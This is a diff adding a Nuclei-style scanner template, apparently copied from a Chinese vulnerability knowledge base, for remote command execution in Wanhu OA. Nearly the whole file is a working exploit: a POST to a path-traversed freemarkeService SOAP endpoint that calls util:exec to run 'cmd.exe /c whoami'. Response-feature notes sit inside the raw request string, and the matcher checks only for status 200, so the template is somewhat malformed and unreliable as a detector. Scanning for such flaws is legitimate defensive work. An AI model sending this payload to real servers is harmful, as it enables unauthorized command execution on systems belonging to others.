@@ -1,0 +1,66 @@
+id: poc-hwkmt1hh22r3kkts
+info:
+  name: 万户 OA 命令执行
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hwkmt1hh22r3kkts'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hwkmt1hh22r3kkts
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /defaultroot/services/./././freemarkeService HTTP/1.1
+
+
+
+
+    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
+
+
+    <soapenv:Header/>
+
+
+    <soapenv:Body>
+
+
+    <util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+
+
+    <arguments xsi:type="xst:ArrayOf_xsd_anyType" soapenc:arrayType="xsd:anyType[]">
+
+
+    <cmd xsi:type="soapenc:string">c:\windows\system32\cmd.exe /c whoami</cmd>
+
+
+    </arguments>
+
+
+    </util:exec>
+
+
+    </soapenv:Body>
+
+
+    </soapenv:Envelope>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?命令)(?=.*?version).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
